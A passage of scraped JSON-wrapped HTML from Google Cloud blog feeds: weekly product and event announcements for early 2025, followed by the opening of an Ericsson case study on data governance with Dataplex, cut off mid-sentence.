30</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Cloud Run GPUs are now GA</strong><span style=\"vertical-align: baseline;\">: NVIDIA GPU support for Cloud Run is now generally available, offering a powerful runtime for a variety of use cases that’s also remarkably cost-efficient. Developers can now get on-demand access to GPUs with our serverless runtime, Cloud Run. Follow the footsteps of customers like MidJourney, vivo, and Wayfair.</span> <a href=\"https://cloud.google.com/blog/products/serverless/cloud-run-gpus-are-now-generally-available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read blog</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><a href=\"https://cloud.google.com/datastream\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Datastream</strong></a><strong style=\"vertical-align: baseline;\"> now supports MongoDB as a source!</strong><span style=\"vertical-align: baseline;\"> Seamlessly ingest data from MongoDB (Replica Sets, Sharded Clusters, self-hosted, AtlasDB) into BigQuery/Cloud Storage. Enjoy scalable, fully-managed data streaming with backfill and CDC, enabling real-time insights and data-driven decisions.</span> <a href=\"https://cloud.google.com/datastream/docs/sources-mongodb#:~:text=Datastream%20supports%20replicating%20change%20events,This%20page%20contains%20information%20about:\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Link</span></a></li>\n</ul>\n<h3>May 19 - May 23</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Beyond cuts and fades: Understanding narrative flow with Gemini for accurate scene transition detection</strong><span style=\"vertical-align: baseline;\"> — </span><span style=\"vertical-align: baseline;\">Google Cloud's Gemini models are revolutionizing video understanding by accurately detecting narrative scene transitions, moving beyond simple cuts and fades. This breakthrough technology understands the holistic context of videos by analyzing visual, audio, and textual elements simultaneously. Media companies can now convert passive video assets into structured data, enabling intelligent content discovery, strategic ad placement, and personalized viewing experiences. The result? Up to 38% increased viewer engagement and 27% reduced abandonment rates. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Read more on the</span> <a href=\"https://lendale-vijaylaxmi.medium.com/39c31f32b585\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">medium blog</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Learn more and access the code repository:</span> <a href=\"https://github.com/GoogleCloudPlatform/generative-ai/pull/1891\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">View Code Repo</span></a></p>\n</li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Announced at I/O: Deploy AI apps to Cloud Run from AI Studio and MCP </strong><span style=\"vertical-align: baseline;\">—</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">We are making AI deployments easier and more accessible by introducing new ways to deploy your apps to Cloud Run.</span>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">You can deploy applications developed in AI Studio with a click of a button to Cloud Run, including Gemma 3. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Model Context Protocol(MCP) is becoming a popular open protocol standardizing how AI agents interact with other tools. Now with Cloud Run MCP server, you can deploy apps from compatible AI agents like from Claude or VS Code Copilot.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-studio-to-cloud-run-and-cloud-run-mcp-server\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read blog</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3>May 12 - May 16</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Google for Startups Accelerator: AI For Energy now accepting applications!<br /></strong><span style=\"vertical-align: baseline;\">Applications are now open for startups headquartered in Europe and Israel, working on solutions for utilities, grid operators and energy developers; solutions for residential and commercial end-use customers focused on demand flexibility and solutions for industrial customers. This equity-free program offers 10 weeks of intensive mentorship and technical project support to startups integrating AI into their core energy services or products. Selected startups will collaborate with a cohort of peer founders and engage with leaders across Google and the energy sector. The curriculum will provide founders with access to AI tools and include workshops on tech and infrastructure, UX and product, growth, sales, leadership and more.</span> <a href=\"https://startup.google.com/programs/accelerator/ai-for-energy/europe-israel/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more and apply</span></a><span style=\"vertical-align: baseline;\"> <strong>before June 30th, 2025</strong>. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Extending Google Cloud Workstations containers to run any GUI based program</strong><span style=\"font-style: italic; vertical-align: baseline;\">Are you having difficulty customizing Google Cloud Workstations to run a GUI program outside of the supported configurations of IDE’s? </span><span style=\"vertical-align: baseline;\">If so, you’re not alone. In this</span> <a href=\"https://medium.com/@roken/extending-google-cloud-workstations-containers-to-run-any-gui-based-program-133d0f905106\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">article</span></a><span style=\"vertical-align: baseline;\"> we discuss how to use the base Workstations Docker image and build it to run a terminal and Google Chrome.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google Cloud Marketplace simplifies deals and improves economics. </span><strong style=\"vertical-align: baseline;\">Announcing three initiatives that build upon Google Cloud Marketplace as a growth engine for customers and partners</strong><span style=\"vertical-align: baseline;\">:</span></p>\n</li>\n</ul>\n<ol>\n<li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Improving partner deal economics</strong> to help partners retain more earnings by moving to a variable revenue share model</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Simplifying commit drawdown</strong> for purchases through channel partners</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Unlocking new workloads</strong> with the Marketplace Customer Credit Program incentive<br /><br /></span><a href=\"https://cloud.google.com/blog/topics/partners/upgrades-to-google-cloud-marketplace-for-partners\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more</span></a></p>\n</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">2025 Google Cloud DORA Awards are now open for submission!</strong><span style=\"vertical-align: baseline;\">Has your team achieved remarkable success through DORA principles? It's time to shine. We're thrilled to announce the launch of the 2025 Google Cloud DORA Awards, celebrating outstanding achievements in technology delivery and operational performance. </span><a href=\"https://cloud.google.com/awards/devops\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Submit</span></a><span style=\"vertical-align: baseline;\"> your story today!</span></li>\n</ul>\n<h3>May 5 - May 9</h3>\n<ul>\n<li><strong>AI assisted development with MCP Toolbox for Databases<br /></strong>We are excited to announce new updates to MCP Toolbox for Databases. Developers can now use Toolbox from their preferred IDE, such as Cursor, Windsurf, Claude Desktop, more and leverage our new pre-built tools such as execute_sql and list_tables for AI-assisted development with Cloud SQL for PostgreSQL, AlloyDB and self-managed PostgreSQL.\n<ul>\n<li>Get Started with <a href=\"https://googleapis.github.io/genai-toolbox/getting-started/mcp_quickstart/\" rel=\"noopener\" target=\"_blank\">MCP Toolbox for Databases</a></li>\n</ul>\n</li>\n</ul>\n<h3>Apr 28 - May 2</h3>\n<ul>\n<li><strong>Itching to build AI agents? Join the Agent Development Kit Hackathon with Google Cloud!</strong> Use ADK to build multi-agent systems to solve challenges around complex processes, customer engagement, content creation, and more. Compete for over $50,000 in prizes and demonstrate the power of multi-agent systems with ADK and Google Cloud.\n<ul>\n<li>Submissions are open from May 12, 2025 to June 23, 2025.</li>\n<li>Learn more and register <a href=\"http://googlecloudmultiagents.devpost.com/\" rel=\"noopener\" target=\"_blank\">here</a><span>.</span></li>\n</ul>\n</li>\n</ul>\n<h3>Apr 21 - Apr 25</h3>\n<ul>\n<li>\n<p><strong>Iceland’s Magic: Reliving Solo Adventure through Gemini<br /></strong>Embark on a journey through Iceland's stunning landscapes, as experienced on Gauti's Icelandic solo trip. From majestic waterfalls to the enchanting Northern Lights, Gautami then takes these cherished memories a step further, using Google's multi-modal AI, specifically Veo2, to bring static photos to life. Discover how technology can enhance and dynamically relive travel experiences, turning precious moments into immersive short videos. This innovative approach showcases the power of AI in preserving and enriching our memories from Gauti's unforgettable Icelandic travels. <a href=\"https://medium.com/@gautami_nadkarni_cloud/icelands-magic-reliving-my-solo-adventure-through-gemini-ai-d61470b9945c\" rel=\"noopener\" target=\"_blank\">Read more</a>.</p>\n</li>\n<li><strong>Introducing ETLC - A Context-First Approach to Data Processing in the Generative AI Era:</strong> As organizations adopt generative AI, data pipelines often lack the dynamic context needed. This paper introduces ETLC (Extract, Transform, Load, Contextualize), adding semantic, relational, operational, environmental, and behavioral context. ETLC enables Dynamic Context Engines for context-aware RAG, AI co-pilots, and agentic systems. It works with standards like the Model Context Protocol (MCP) for effective context delivery, ensuring business-specific AI outputs. <a href=\"https://services.google.com/fh/files/blogs/etlc_full_paper.pdf\" rel=\"noopener\" target=\"_blank\">Read the full paper</a>.</li>\n</ul>\n<h3>Apr 14 - Apr 18</h3>\n<ul>\n<li>\n<p><strong>What’s new in Database Center</strong><br />With general availability, <a href=\"https://cloud.google.com/database-center/docs/overview\" rel=\"noopener\" target=\"_blank\">Database Center</a> now provides enhanced performance and health monitoring for all Google Cloud databases, including Cloud SQL, AlloyDB, Spanner, Bigtable, Memorystore, and Firestore. It delivers richer metrics and actionable recommendations, helps you to optimize database performance and reliability, and customize your experience. Database Center also leverages Gemini to deliver assistive performance troubleshooting experience. Finally, you can track the weekly progress of your database inventory and health issues. </p>\n<p>Get started with Database Center today</p>\n<p><span id=\"m_-5735904157727247169gmail-docs-internal-guid-47cc0dbe-7fff-37b6-3106-7a6506e08d8f\"></span></p>\n<ul>\n<li>\n<p><a href=\"https://console.cloud.google.com/database-center\">Access Database Center in Google Cloud console </a></p>\n</li>\n<li>\n<p><a href=\"https://cloud.google.com/database-center/docs/overview\">Review the documentation to learn more</a></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3>Apr 7 - Apr 11</h3>\n<ul>\n<li>This week, at Google Cloud Next, we announced an expansion of Bigtable's SQL capabilities and introduced continuous materialized views. Bigtable SQL and continuous materialized views empower users to build fully-managed, real-time application backends using familiar SQL syntax, including specialized features that preserve Bigtable's flexible schema — a vital aspect of real-time applications. Read more in this <a href=\"https://cloud.google.com/blog/products/databases/accelerate-your-analytics-with-new-bigtable-sql-capabilities\" rel=\"noopener\" target=\"_blank\">blog</a>.</li>\n<li><strong>DORA Report Goes Global: Now Available in 9 Languages!<br /></strong>Unlock the power of DevOps insights with the DORA report, now available in 9 languages, including Chinese, French, Japanese, Korean, Portuguese, and Spanish. Global teams can now optimize their practices, benchmark performance, and gain localized insights to accelerate software delivery. The report highlights the significant impact of AI on software development, explores platform engineering’s promises and challenges, and emphasizes user-centricity and stable priorities for organizational success. <a href=\"https://cloud.google.com/devops/state-of-devops\" rel=\"noopener\" target=\"_blank\">Download the DORA Report Now</a></li>\n<li><strong>New Google Cloud State of AI Infrastructure Report Released<br /></strong>Is your infrastructure ready for AI? The 2025 State of AI Infrastructure Report is here, packed with insights from 500+ global tech leaders. Discover the strategies and challenges shaping the future of AI and learn how to build a robust, secure, and cost-effective AI-ready cloud. Download the report and enhance your AI investments today. <a href=\"https://cloud.google.com/resources/content/state-of-ai-infrastructure?hl=en\" rel=\"noopener\" target=\"_blank\">Download the 2025 AI infrastructure report now</a></li>\n<li><strong>Google Cloud and Oracle Accelerate Enterprise Modernization with New Regions, Expanded Capabilities<br /></strong>Announcing major Oracle Database@Google Cloud enhancements! We're launching the flexible Oracle Base Database Service and powerful new Exadata X11M machines. We're rapidly expanding to 20 global locations, adding new Partner Cross-Cloud Interconnect options, and introducing Cross-Region Disaster Recovery for Autonomous Database. Benefit from enhanced Google Cloud Monitoring, integrated Backup &amp; DR, plus expanded support for enterprise applications like SAP. Customers can run critical Oracle workloads with more power, resilience, and seamless Google Cloud integration. Get started right away from your Google Cloud Console or <a href=\"https://cloud.google.com/solutions/oracle\" rel=\"noopener\" target=\"_blank\">learn more here</a><span>.</span></li>\n</ul>\n<h3>Mar 17 - Mar 21</h3>\n<ul>\n<li><strong>Cloud CISO Perspectives: 5 tips for secure AI success </strong>-<strong> </strong>To coincide with new AI Protection capabilities in Security Command Center, we’re offering 5 tips to set up your organization for <a href=\"https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-tips-secure-ai-success\" rel=\"noopener\" target=\"_blank\">secure AI success</a>.</li>\n<li><strong>Our 4-6-3 rule for strengthening security ties to business: </strong>The desire to quickly transform a business can push leaders to neglect security and resilience, but prioritizing security can unlock value. Follow these 4 principles, 6 steps, and 3 metrics to use a security-first mindset to <a href=\"https://cloud.google.com/transform/our-4-6-3-rule-strengthening-security-ties-business/\" rel=\"noopener\" target=\"_blank\">drive business results</a>.</li>\n<li><strong>The new Data Protection Tab in Compute Engine ensures your resources are protected:</strong> Not only have we co-located your backup options, but we also have introduced smart default data protection for any Compute Engine instance created via Cloud Console. Here’s <a href=\"https://cloud.google.com/blog/products/storage-data-transfer/console-gains-data-protection-interface-for-backup-and-dr?e=48754805\" rel=\"noopener\" target=\"_blank\">how it works.</a></li>\n<li><strong>DORA report - Impact of Generative AI in Software Development<br /></strong>This report builds on and extends DORA's research into AI. We review the current landscape of AI adoption, look into its impact on developers and organizations, and outline a framework and practical guidance for successful integration, measurement, and continuous improvement. <a href=\"https://cloud.google.com/resources/content/dora-impact-of-gen-ai-software-development\" rel=\"noopener\" target=\"_blank\">Download the report</a>!</li>\n</ul>\n<h3>Mar 10 - Mar 14</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Protecting your APIs from OWASP’s top 10 security threats</strong><span style=\"vertical-align: baseline;\">: We compare OWASP’s top 10 API security threats list to the security capabilities of Apigee. Here’s how</span> <a href=\"https://cloud.google.com/blog/products/identity-security/protecting-your-apis-from-owasps-top-10-security-threats\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we hold up</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Project Shield makes it easier to sign up, set up, automate DDoS protection</strong>: It’s now easier than ever for vulnerable organizations to apply to Project Shield, set up protection, and automate their defenses.</span> <a href=\"https://cloud.google.com/blog/products/identity-security/project-shield-makes-it-easier-to-sign-up-set-up-automate-ddos-protection\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Here’s how</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">How Google Does It: Red teaming at Google scale </strong><span style=\"vertical-align: baseline;\">- The best red teams are creative sparring partners for defenders, probing for weaknesses. Here’s how we do</span> <a href=\"https://cloud.google.com/transform/how-google-does-it-red-teaming-at-scale/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">red teaming at Google scale</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/solutions/ai-hypercomputer?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</strong></a><strong style=\"vertical-align: baseline;\"> is a fully integrated supercomputing architecture for AI workloads – and it’s easier to use than you think</strong><span style=\"vertical-align: baseline;\">. Check out <a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-hypercomputer-4-use-cases-tutorials-and-guides\">this blog</a>, where we break down four common use cases, including reference architectures and tutorials, representing just a few of the many ways you can use AI Hypercomputer today. </span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Transform Business Operations with Gemini-Powered SMS-iT CRM on Google Cloud:</strong><span style=\"vertical-align: baseline;\"> SMS-iT CRM on Google Cloud unifies SMS, MMS, email, voice, and 22+ social channels into one Smart Inbox. Enjoy real-time voice interactions, AI chatbots, immersive video conferencing, AI tutors, AI operator, and unlimited AI agents for lead management. Benefit from revenue-driven automation, intelligent appointment scheduling with secure payments, dynamic marketing tools, robust analytics, and an integrated ERP suite that streamlines operations from project management to commerce. This comprehensive solution is designed to eliminate inefficiencies and drive exponential growth for your business. </span><a href=\"https://console.cloud.google.com/marketplace/product/smsit-public/sms-it-crm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Experience the Future Today</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li style=\"vertical-align: baseline;\">\n<p><strong><span style=\"vertical-align: baseline;\">Join us for a new webinar,</span> </strong><a href=\"https://event.on24.com/wcc/r/4863138/B9EF106CA3251057A83169D2F984A50D?partnerref=google\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>Smarter CX, Bigger Impact: Transforming Customer Experiences with Google AI</strong></span></a><span style=\"vertical-align: baseline;\">, where we'll explore how Google AI can help you deliver exceptional customer experiences and drive business growth. You'll learn how to:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Transform Customer Experiences:  With conversational AI agents that provide personalized customer engagements.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Improve Employee Productivity &amp; Experience: With AI that monitors customers sentiment in real-time, and assists customer service representatives to raise customer satisfaction scores.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deliver Value Faster: With  30+ data connectors and 70+ action connectors to the most commonly used CRMs and information systems.<br /><br /></span><span style=\"vertical-align: baseline;\">Register</span> <a href=\"https://event.on24.com/wcc/r/4863138/B9EF106CA3251057A83169D2F984A50D?partnerref=google\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a></p>\n</li>\n</ul>\n</ul>\n<h3>Mar 3 - Mar 7</h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/products/infrastructure/google-cloud-launches-42nd-cloud-region-in-sweden\" rel=\"noopener\" target=\"_blank\"><strong>Hej Sverige! Google Cloud launches new region in Sweden</strong></a> - More than just another region, it represents a significant investment in Sweden's future and Google’s ongoing commitment to empowering businesses and individuals with the power of the cloud. This new region, our 42nd globally and 13th in Europe, opens doors to opportunities for innovation, sustainability, and growth — within Sweden and across the globe. We're excited about the potential it holds for your digital transformations and AI aspirations.</li>\n<li><strong>[March 11th webinar] Building infrastructure for the Generative AI era: insights from the 2025 State of AI Infra report: </strong>Staying at the forefront of AI requires an infrastructure built for AI. Generative AI is revolutionizing industries, but it demands a new approach to infrastructure. In this webinar, we'll unveil insights from Google Cloud's latest research report and equip tech leaders with a practical roadmap for building and managing gen AI workloads, including: the top gen AI use cases driving the greatest return on investment, current infrastructure approaches and preferences for Generative AI workloads, the impact of performance benchmarks, scalability, and security on cloud provider selection. <a href=\"https://cloudonair.withgoogle.com/events/insights-from-the-2025-google-research-report\" rel=\"noopener\" target=\"_blank\">Register today</a>.</li>\n<li><strong>Cloud CISO Perspectives: Why PQC is the next Y2K, and what you can do about it</strong>: Much like Y2K 25 years ago, post-quantum cryptography may seem like the future’s problem — but it will soon be ours if IT doesn’t move faster, explains Google Cloud’s Christiane Peters. Here's how business leaders can <a href=\"https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-prepare-early-for-PQC-resilient-cryptographic-threats\" rel=\"noopener\" target=\"_blank\">get going on PQC prep</a>.</li>\n<li><strong>How Google Does It: Using threat intelligence to uncover and track cybercrime</strong> — How does Google use threat intelligence to uncover and track cybercrime? Google Threat Intelligence Group’s Kimberly Goody takes you <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime/\" rel=\"noopener\" target=\"_blank\">behind the scenes</a>.</li>\n<li><strong>5 key cybersecurity strategies for manufacturing executives</strong> — Here are five key governance strategies that can help manufacturing executives build a robust cybersecurity posture and better mitigate the <a href=\"https://cloud.google.com/transform/5-key-cybersecurity-strategies-manufacturing-executives\" rel=\"noopener\" target=\"_blank\">evolving risks they face</a>.</li>\n<li><strong><a href=\"https://cloud.google.com/datastream?e=48754805&amp;hl=en\" rel=\"noopener\" target=\"_blank\">Datastream</a> now offers Salesforce source in Preview.</strong> Instantly connect, capture changes, and deliver data to <strong>BigQuery</strong>, <strong>Cloud Storage</strong>, etc. Power real-time insights with flexible authentication and robust backfill/CDC. Unlock Salesforce data for Google Cloud analytics, reporting, and generative AI. Read the <a href=\"https://cloud.google.com/datastream/docs/sources-salesforce\">documentation</a> to learn more.</li>\n<li><strong>Find out how much you can save with Spanner - </strong>According to a recent Forrester Total Economic Impact™ study, by migrating to Spanner from a traditional database, a $1 billion per year B2C organization could get a 132% return on investment (ROI) with a 9-month payback period, and realize $7.74M in total benefits over the three years. To see how, check out <a href=\"https://cloud.google.com/blog/products/databases/forrester-tei-study-on-spanner-shows-benefits-and-cost-savings?e=48754805\" rel=\"noopener\" target=\"_blank\">the blog</a> or download <a href=\"https://cloud.google.com/resources/content/forrester-spanner-tei-study?e=48754805\" rel=\"noopener\" target=\"_blank\">the report</a>. </li>\n<li><strong>GenAI Observability for Developers series</strong>: The Google Cloud DevRel team hosted a four-part webinar series, \"Gen AI Observability for Developers,\" demonstrating observability best practices in four programming languages. Participants learned to instrument a sample application deployed on Cloud Run for auditing Vertex AI usage, writing structured logs, tracking performance metrics, and utilizing OpenTelemetry for tracing. The series covered Go, Java, NodeJS, and Python, using common logging and web frameworks. Missed it? Recordings and hands-on codelabs are available to guide you at:\n<ul>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-go-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Go Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-java-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Java Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-javascript-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for NodeJS Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-python-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Python Developers</a><br /><br />Stay tuned for future events at <a href=\"https://cloudonair.withgoogle.com/\" rel=\"noopener\" target=\"_blank\">cloudonair.withgoogle.com.</a></li>\n</ul>\n</li>\n</ul>\n<h3>Feb 24 - Feb 28</h3>\n<ul>\n<li><strong>Rethinking 5G: </strong>Ericsson and Google Cloud are collaborating to redefine 5G mobile core networks with a focus on autonomous operations. By leveraging AI and cloud infrastructure, we aim to enhance efficiency, security, and innovation in the telecommunications industry. This partnership addresses the increasing demands of 5G and connected devices, paving the way for a more dynamic and intelligent network future, and setting the stage for next-generation technologies like 6G. Learn more <a href=\"https://cloud.google.com/blog/topics/telecommunications/ericsson-and-google-cloud-collaborating-on-5g\" rel=\"noopener\" target=\"_blank\">here</a><span>.</span></li>\n<li><span>Adopt a principles-centered <a href=\"https://cloud.google.com/blog/products/application-modernization/well-architected-framework-to-accelerate-your-cloud-journey\" rel=\"noopener\" target=\"_blank\">well-architected framework</a> to design, build, deploy, and manage Google Cloud workloads that are secure, resilient, efficient, cost-efficient, and high-performing. Also get industry and technology-focused well-architected framework guidance, like for AI and ML workloads.</span></li>\n</ul>\n<h3>Feb 17 - Feb 21</h3>\n<ul>\n<li><strong>Easier Default Backup Configuration for Compute Engine Instances</strong> - The Create a Compute Instance page in the Google Cloud console now includes enhanced <strong>data protection options</strong> to streamline backup and replication configurations. By default, an option to back up data is pre-selected, ensuring recoverability in case of unforeseen events. Learn more <a href=\"https://cloud.google.com/compute/docs/disks/default-backup\" rel=\"noopener\" target=\"_blank\">here</a>.</li>\n</ul>\n<h3>Feb 10 - Feb 14</h3>\n<ul>\n<li><strong>[Webinar] Generative AI for Software Delivery: Strategies for IT Leaders: </strong>Generative AI is transforming the way organizations build and deploy software. <strong>Join Google Cloud experts on February 26th</strong> to learn how organizations can leverage AI to streamline their software delivery, including: the role of gen AI in software development, how to use gen AI for migration and modernization, best practices for integrating gen AI into your existing workflows, and real-world applications of gen AI in software modernization and migration through live demos. <a href=\"https://cloudonair.withgoogle.com/events/generative-ai-for-software-delivery\" rel=\"noopener\" target=\"_blank\">Register here.</a></li>\n</ul>\n<h3>Feb 3 - Feb 7</h3>\n<ul>\n<li>SQL is great but not perfect. We’d like to invite you to reimagine how you write SQL with Google’s newest invention: pipe syntax (public available to all BigQuery and Cloud Logging users). This new extension to GoogleSQL brings a modern, streamlined approach to data analysis. Now you can write simpler, shorter and more flexible queries for faster insights. Check out this <a href=\"https://www.youtube.com/watch?v=mW2CLYr6w4M\" rel=\"noopener\" target=\"_blank\">video</a> to learn more. </li>\n</ul>\n<h3>Jan 13 - Jan 17</h3>\n<ul>\n<li><strong>C4A virtual machines with Titanium SSD</strong>—the first Axion-based, general-purpose instance with Titanium SSD<strong>, </strong>are now generally available. C4A virtual machines with Titanium SSDs are custom designed by Google for cloud workloads that require real-time data processing, with low-latency and high-throughput storage performance. Titanium SSDs enhance storage security and performance while offloading local storage processing to free up CPU resources. Learn more <a href=\"https://cloud.google.com/blog/products/compute/first-google-axion-processor-c4a-now-ga-with-titanium-ssd\" rel=\"noopener\" target=\"_blank\">here</a>.</li>\n</ul>\n<h3>Jan 6 - Jan 10</h3>\n<div>\n<ul>\n<li><strong>A look back on a year of Earth Engine advancements: </strong>2024 was a landmark year for Google Earth Engine, marked by significant advancements in platform management, cloud integration, and core functionality and increased interoperability between Google Cloud tools and services. Here’s a <a href=\"https://cloud.google.com/blog/topics/sustainability/look-back-at-a-year-of-earth-engine-advancements\" rel=\"noopener\" target=\"_blank\">round up of 2024’s top Earth Engine launches</a><span>.</span></li>\n<li><strong>Get early access to our new Solar API data and features: </strong>We're excited to announce that we are working on 2 significant expansions to the Solar API from Google Maps Platform and are looking for trusted testers to help us bring them to market. These include improved and expanded buildings coverage and greater insights for existing solar installations with Detected Arrays. <a href=\"https://mapsplatform.google.com/resources/blog/early-access-unlock-expanded-coverage-and-greater-insights-in-the-solar-api/?linkId=12083502\" rel=\"noopener\" target=\"_blank\">Learn more.</a></li>\n<li><a href=\"https://startup.google.com/programs/accelerator/women-founders/europe\" rel=\"noopener\" target=\"_blank\"><strong>Google for Startups Accelerator: Women Founders</strong></a> applications are now open for women-led startups headquartered in Europe and Israel. <a href=\"https://cloud.google.com/blog/topics/startups/google-for-startups-accelerator-for-women-led-tech-startups\" rel=\"noopener\" target=\"_blank\">Discover</a> why this program could be the perfect fit for your startup and apply before January 24th, 2025.</li>\n<li><strong>Best of N: Generating High-Quality Grounded Answers with Multiple Drafts - </strong>We are excited to announce that <a href=\"https://cloud.google.com/generative-ai-app-builder/docs/check-grounding\" rel=\"noopener\" target=\"_blank\">Check Grounding API</a> has released a new helpfulness score feature. Building on top of our existing groundedness score, we now enable users to implement Best of N to improve RAG response quality without requiring extensive model retraining. Learn more about Best of N and how it can help you <a href=\"https://medium.com/@amattapalli/best-of-n-generating-high-quality-grounded-answers-with-multiple-drafts-396101ac04d3\" rel=\"noopener\" target=\"_blank\">here.</a></li>\n</ul>\n</div></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/telecommunications/how-ericsson-achieves-data-integrity-and-superior-governance-with-dataplex/",
        "title": "How Ericsson achieves data integrity and superior governance with Dataplex",
        "thumbnail": null,
        "author": "Akanksha Bhagwanani",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Data is the engine of modern telecommunications. For Ericsson's Managed Services, which operates a global network of more than 710,000 sites, harnessing this data is not just an advantage, it's essential for business growth and leadership. To power the future of its </span><a href=\"https://www.ericsson.com/en/ai/autonomous-networks\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">autonomous network operations</span></a><span style=\"vertical-align: baseline;\"> and deliver on its strategic priorities, Ericsson has been on a transformative data journey with governance at the center of its strategy.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ericsson moved from foundational practices to a sophisticated, business-enabling data governance framework using </span><a href=\"https://cloud.google.com/dataplex\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud’s Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">, turning data from a simple resource into a strategic asset.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">From a new operating model to a new data mindset</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ericsson’s journey began in 2019 with the launch of the </span><a href=\"https://www.ericsson.com/en/managed-services/ericsson-operation-engine\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ericsson Operations Engine</span></a><span style=\"vertical-align: baseline;\"> (EOE), a groundbreaking, AI-powered operating model for managing complex, multi-vendor telecom networks. The EOE made one thing clear: to succeed,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">data had to be at the core of everything.</span></p>\n<p><span style=\"vertical-align: baseline;\">This realization led Ericsson to develop its first enterprise data strategy, which established the core principles for how data is collected, managed and governed. However, building a strategy is one thing — operationalizing it at scale is another.</span></p>\n<p><span style=\"vertical-align: baseline;\">To move beyond theory to address real-world challenges, Ericsson needed to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build trust:</strong><span 